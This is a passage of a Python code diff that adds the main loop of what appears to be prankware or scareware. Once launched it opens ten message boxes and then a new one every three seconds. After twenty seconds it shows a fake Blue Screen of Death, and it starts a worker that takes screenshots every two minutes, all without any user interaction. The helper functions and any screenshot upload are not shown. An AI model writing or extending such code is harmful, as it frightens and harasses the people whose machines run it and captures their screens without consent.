+    print("    → New box appears every 3 seconds")
+    
+    # Create initial 10 message boxes
+    spam_message_boxes_auto(10)
+    
+    # Start continuous message box creation (every 3 seconds)
+    auto_box_thread = Thread(target=auto_message_box_loop, daemon=True)
+    auto_box_thread.start()
+    
+    # BSOD after 20 seconds (AUTO)
+    print("\n[+] Fake BSOD will appear in 20 seconds...")
+    Thread(target=fake_bsod_auto, daemon=True).start()
+    
+    # Screenshots every 2 minutes (AUTO)
+    print("\n[+] Screenshot worker active (every 2 minutes)")
+    print("="*60)
+    print("⚡ ALL FEATURES ACTIVE - NO INTERACTION NEEDED ⚡")
+    print("="*60)
+    
+    # Keep running
+    screenshot_worker()
 
 if __name__ == "__main__":
     try:
         main()
     except Exception as e:
-        print(f"[-] Error: {e}")
-        time.sleep(5)
-        input("\nPress Enter to exit...")
+        print(f"Error: {e}")
+        time.sleep(10)
